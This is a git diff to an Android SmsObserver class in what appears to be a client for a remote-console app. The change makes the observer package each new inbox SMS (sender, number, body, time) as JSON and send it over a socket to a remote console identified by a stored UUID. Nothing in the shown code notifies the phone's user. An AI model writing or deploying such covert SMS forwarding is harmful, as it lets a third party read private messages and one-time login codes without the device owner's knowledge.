@@ -2,15 +2,27 @@ package com.lsper.client.observer;
 
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.SharedPreferences;
 import android.database.ContentObserver;
 import android.database.Cursor;
+import android.graphics.Paint;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Handler;
 import android.text.TextUtils;
 import android.util.Log;
 
+import com.google.gson.Gson;
+import com.lsper.client.ClientObjectKt;
+import com.lsper.client.bean.Content;
+import com.lsper.client.bean.Sms;
+
+import org.slf4j.helpers.Util;
+
 import java.util.Observable;
+
+import kotlin.Unit;
+import kotlin.time.DurationUnitKt;
 
 public class SmsObserver extends ContentObserver {
         // 只检查收件箱
@@ -30,10 +42,11 @@ public class SmsObserver extends ContentObserver {
 
         private static final long DELTA_TIME = 60 * 1000;
         private ContentResolver mResolver;
-
-        public SmsObserver(ContentResolver resolver, Handler handler) {
+        private Context context;
+        public SmsObserver(Context context, Handler handler) {
             super(handler);
-            mResolver = resolver;
+            this.context = context;
+            mResolver = context.getContentResolver();
         }
 
         @Override
@@ -71,8 +84,38 @@ public class SmsObserver extends ContentObserver {
                         return;
                     }
                     // 得到短信号码和内容之后进行相关处理
-                    Log.e("sms",body);
-                    Log.e("sms",date);
+                    Sms sms = new Sms();
+                    if (person!=null){
+                        sms.setPerson(person);
+                    }
+                    sms.setLateTime(Long.valueOf(date));
+                    sms.setPhoneNumber(address);
+                    sms.setSmsContent(body);
+
+
+                    SharedPreferences sp = context.getSharedPreferences("UUID",Context.MODE_PRIVATE);
+                    String recipientUUID =  sp.getString("consoleUUID",null);
+                    String localUUID = sp.getString("localUUID",null);
+                    if (recipientUUID!=null&&localUUID!=null){
+                        Content content = new Content();
+                        content.setOrigin("client");
+                        content.setRecipientUUID(recipientUUID);
+                        content.setSenderUUID(localUUID);
+                        content.setType("getSMS");
+
+                        String jsonSMS = new Gson().toJson(sms);
+                        content.setContent(jsonSMS);
+
+                        String jsonContent = new Gson().toJson(content);
+                        ClientObjectKt.socketClient.send(jsonContent);
+
+                    }
+
+
+
+
+
+
                 }
             } catch (Exception e) {
                 e.printStackTrace();
